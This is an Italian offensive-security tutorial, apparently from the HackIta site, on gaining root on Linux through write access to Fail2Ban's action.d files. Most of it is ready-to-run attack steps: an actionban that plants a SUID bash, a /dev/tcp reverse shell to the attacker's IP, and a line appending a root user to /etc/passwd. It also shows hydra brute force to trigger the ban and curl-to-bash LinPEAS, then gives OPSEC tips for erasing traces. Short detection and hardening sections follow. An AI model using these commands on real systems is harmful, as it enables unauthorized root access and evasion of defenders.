---
title: 'Fail2Ban Privilege Escalation: Exploit Linux per Ottenere Root'
slug: fail2ban
description: >-
  Scopri come sfruttare una misconfigurazione di Fail2Ban ,cos'è e come ottenere
  root su Linux: enumerazione, exploit, trigger del ban, detection e hardening.
image: /fail2ban.webp
draft: false
date: 2026-04-07T00:00:00.000Z
categories:
  - linux
subcategories:
  - privilege-escalation
tags:
  - fail2ban
  - linux privilege escalation
---

# Fail2Ban Privilege Escalation: Come Ottenere Root su Linux Sfruttando action.d

Fail2Ban gira come root. Se hai write access su `/etc/fail2ban/action.d/` e puoi riavviare il servizio, esegui comandi arbitrari come root. Questa guida copre enumerazione, exploit e detection.

***

### TL;DR

Se hai write access su `/etc/fail2ban/action.d/` e puoi riavviare Fail2Ban, puoi eseguire qualsiasi comando come root.

***

## Cos'è Fail2Ban e Perché è un Vettore di Privilege Escalation Linux

Fail2Ban è un IPS per Linux. Monitora `/var/log/auth.log` e banna gli IP che superano una soglia di tentativi falliti, modificando le regole iptables in tempo reale.

Di default: 5 tentativi falliti in 10 minuti → ban di 10 minuti.

La Fail2Ban privilege escalation funziona perché **il demone gira come root**. Se controlli i file di azione che esegue al momento del ban, controlli cosa root esegue.

***

## Condizioni Necessarie per il Fail2Ban Exploit

Devono essere vere entrambe:

1. **Write access** su `iptables-multiport.conf` o `iptables.conf` in `/etc/fail2ban/action.d/`
2. **Possibilità di riavviare** il servizio per applicare le modifiche

Se manca anche solo una delle due, l'exploit non funziona.

***

## Enumerazione Manuale della Privilege Escalation via Fail2Ban

### Verifica gruppo e permessi

```bash
whoami ; id
```

Cerca `fail2ban` tra i gruppi. Se non ci sei, cerca chi c'è:

```bash
getent group | grep -i fail2ban
```

### Versione e stato del servizio

```bash
fail2ban-client --version
systemctl status fail2ban
ps -ef | grep fail2ban
```

Conferma che il processo gira come `root` dall'output di `ps`.

### Permessi sulla cartella action.d

```bash
ls -la /etc/fail2ban/
ls -la /etc/fail2ban/action.d/
```

Quello che vuoi: il gruppo `fail2ban` (o il tuo utente) ha write su `action.d/` e sui file dentro.

> **Nota versione:** Fail2Ban `<= 0.11.2` → target è `iptables-multiport.conf`. Versione `>= 1.0.1` → target è `iptables.conf`.

### Jail attivi

```bash
cat /etc/fail2ban/jail.conf
cat /etc/fail2ban/jail.local
```

Identifica quale servizio è protetto — SSH è il più comune. Ti serve per triggerare il ban.

### Verifica sudo per il riavvio

```bash
sudo -l
```

Quello che vuoi vedere:

```
(root) NOPASSWD: /etc/init.d/fail2ban restart
```

***

## Enumerazione Automatica con LinPEAS e LSE

[LinPEAS](https://hackita.it/articoli/linpeas) identifica automaticamente i vettori Fail2Ban. Eseguilo in memoria:

```bash
curl <tuo_ip>/linpeas.sh | bash
```

Cerca nell'output:

* **Basic Information** → conferma se sei nel gruppo `fail2ban`
* **Sudo permissions** → verifica se puoi riavviare il servizio
* **Interesting GROUP Writable Files** → file in `action.d/` modificabili

> LinPEAS può non rilevare la versione e i jail configurati — integra sempre con verifica manuale.

In alternativa usa [LSE](https://hackita.it/articoli/lse) con livello 2 per un output ordinato per severità.

***

## Fail2Ban Exploit: Ottenere Root Shell su Linux

### Metodo 1 — SUID su /bin/bash (più veloce)

**Step 1:** Modifica `actionban`:

```bash
nano /etc/fail2ban/action.d/iptables-multiport.conf
```

Commenta l'`actionban` originale e sostituisci:

```
actionban = cp /bin/bash /tmp/bash && chmod 4755 /tmp/bash
```

**Step 2:** Riavvia il servizio:

```bash
sudo /etc/init.d/fail2ban restart
```

**Step 3:** Triggera il ban con 5 tentativi SSH falliti:

```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<target> -t 4
```

**Step 4:** Ottieni root:

```bash
ls -la /tmp/bash
/tmp/bash -p
```

***

### Metodo 2 — Reverse Shell

Modifica `actionban`:

```
actionban = bash -c 'bash -i >& /dev/tcp/<tuo_ip>/9001 0>&1'
```

Riavvia, apri listener e triggera il ban:

```bash
nc -lvnp 9001
```

***

### Metodo 3 — Aggiungi Utente Root

```
actionban = echo 'hacker:$6$salt$hash:0:0:root:/root:/bin/bash' >> /etc/passwd
```

Genera l'hash con `openssl passwd -6 tua_password`.

***

## Perché Funziona la Privilege Escalation su Fail2Ban

Fail2Ban esegue `actionban` come root ad ogni ban. Se controlli `actionban`, controlli cosa esegue root. Il riavvio è necessario per ricaricare la configurazione modificata — senza, Fail2Ban usa ancora quella in memoria.

***

## Kill Chain Completa

| Fase               | Comando                                               |
| ------------------ | ----------------------------------------------------- |
| Verifica gruppo    | `id` / `getent group \| grep fail2ban`                |
| Stato servizio     | `ps -ef \| grep fail2ban`                             |
| Permessi action.d  | `ls -la /etc/fail2ban/action.d/`                      |
| Sudo check         | `sudo -l`                                             |
| Modifica actionban | `nano /etc/fail2ban/action.d/iptables-multiport.conf` |
| Riavvio servizio   | `sudo /etc/init.d/fail2ban restart`                   |
| Trigger ban        | `hydra -l root -P rockyou.txt ssh://<target>`         |
| Root shell         | `/tmp/bash -p`                                        |

***

## Detection & OPSEC

**Blue Team — cosa monitorare:**

* Modifiche ai file in `/etc/fail2ban/action.d/` con auditd, AIDE o Tripwire
* Riavvii di Fail2Ban da utenti non root
* Creazione di SUID binary in `/tmp`
* Connessioni in uscita inattese dopo eventi di ban

**OPSEC:**

* Ripristina `iptables-multiport.conf` originale dopo l'exploit
* Cancella `/tmp/bash` dopo aver ottenuto la shell
* Preferisci reverse shell a SUID in ambienti con file integrity monitoring

***

## Hardening

* Nessun write access a `action.d/` per utenti non root
* Gruppo `fail2ban` solo a chi serve davvero
* Sudo per il riavvio di Fail2Ban solo se strettamente necessario
* Monitoraggio delle modifiche ai file di configurazione con auditd

***

Uso esclusivo in ambienti autorizzati.

Se questo articolo ti è stato utile e vuoi supportare HackIta, puoi farlo qui: [hackita.it/supporto](https://hackita.it/supporto)

Se vuoi fare sul serio — formazione 1:1, lab guidati o far testare la tua azienda — trovi tutto qui: [hackita.it/servizi](https://hackita.it/servizi)
